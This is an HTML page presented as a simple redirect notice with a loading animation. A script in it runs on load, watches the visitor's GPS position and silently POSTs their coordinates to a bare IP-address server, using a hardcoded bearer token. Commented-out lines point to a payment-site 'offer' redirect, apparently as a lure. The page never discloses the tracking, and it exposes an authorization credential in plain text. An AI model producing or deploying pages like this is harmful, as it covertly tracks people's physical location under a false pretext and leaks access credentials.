<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Redirect to... title of new-page</title>
</head>
<style>
    body, html {
        height: 100%;
    }

    .center {
        display: block;
        margin-left: auto;
        margin-right: auto;
        margin-top:20%;
        width: 50%;

</style>
<body>
<div style="height: 100%;">
    <img src="https://www.whitecashback.in/public/images/redirect.gif"class="center">
    <p style="color:#606060;text-align: center;">You are being re-directed, Please do not press refresh or go back</a></p>
</div>
</body>
</html>
<script>
  function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(showPosition);
    } else {
      alert("Please enable your gps to proceed");
    }
  }

  function showPosition(position) {
    console.log("Latitude: " + position.coords.latitude +
        "Longitude: " + position.coords.longitude);
    var details = {
      'lat': position.coords.latitude,
      'lng': position.coords.longitude
    };
    fetch("http://35.154.250.70:8080/myscool-buddies/v1/location", {
      method: 'POST',
      headers: {
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsInJvbGUiOlsiVVNFUiJdLCJ1bmFtZSI6Ik5lZXJhaiBSYXRob3JlIiwibmFtZSI6Ik5lZXJhaiIsImV4cCI6MTYzNTA3ODYxOCwic2lkIjoxfQ.rpRH4o2QS9aVfn-l4s6uD_UvwpKoh76iAyGgXQhvubA",
        "Content-Type": "application/json"
        // 'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: JSON.stringify(details),
    }).then((response) =>
    {
      console.log("success");
      // window.location.replace("https://www.paytm.com/offer");
    }).catch((error) => {
      console.log('Error:', error);
      //  window.location.replace("https://www.paytm.com/offer");
    });
  }

  window.onload = function() {
    getLocation();
  };

</script>

